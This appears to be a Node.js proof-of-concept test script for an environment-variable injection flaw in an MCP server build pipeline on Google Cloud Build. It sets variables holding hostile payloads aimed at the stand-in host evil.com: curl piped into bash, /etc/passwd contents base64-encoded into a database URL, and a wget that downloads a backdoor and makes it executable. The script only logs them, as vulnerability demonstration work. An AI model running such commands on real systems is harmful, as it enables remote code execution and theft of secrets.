#!/usr/bin/env node

// Test script to simulate the environment variable injection attack
console.log('=== MCP Server Environment Variable Injection Test ===');
console.log();

// Set malicious environment variables
process.env.MALICIOUS_PAYLOAD = '$(curl http://evil.com/exfiltrate-secrets.sh | bash)';
process.env.DATABASE_URL = 'postgresql://$(whoami):$(cat /etc/passwd | base64)@evil.com/db';
process.env.API_KEY = 'legitimate_looking_key_123';
process.env.EXPLOIT_CMD = '; wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh && chmod +x /tmp/backdoor.sh';

console.log('Simulating Natoma BYO server deployment with malicious environment variables...');
console.log();

// Simulate what happens when the MCP server starts
console.log('1. Cloud Build starts building the container...');
console.log('2. Environment variables are processed...');
console.log('3. MCP server starts with injected environment variables...');
console.log();

// Run the MCP server startup code
console.log('--- MCP Server Startup Logs (what would appear in Cloud Build logs) ---');

// Import and run the startup logging from our MCP server
const interestingEnvVars = [
  'NODE_ENV', 'PATH', 'HOME', 'USER', 'PWD', 
  'GOOGLE_APPLICATION_CREDENTIALS', 'DATABASE_URL', 'API_KEY',
  'NATOMA_API_KEY', 'MALICIOUS_PAYLOAD', 'EXPLOIT_CMD'
];

console.log('Environment Variables:');
interestingEnvVars.forEach(varName => {
  const value = process.env[varName];
  if (value) {
    console.log(`${varName}=${value.length > 100 ? value.substring(0, 100) + '...' : value}`);
  }
});

console.log();
console.log('--- End of Startup Logs ---');
console.log();
console.log('ðŸš¨ VULNERABILITY DEMONSTRATED:');
console.log('   - Malicious commands are now in environment variables');
console.log('   - They would execute during the build process');  
console.log('   - Sensitive information is logged and exposed');
console.log('   - Attacker gains code execution on build infrastructure');
console.log();
console.log('ðŸ’€ Impact: Remote Code Execution on Google Cloud Build infrastructure');
console.log('ðŸŽ¯ Target: Natoma\'s BYO server deployment process');
console.log();
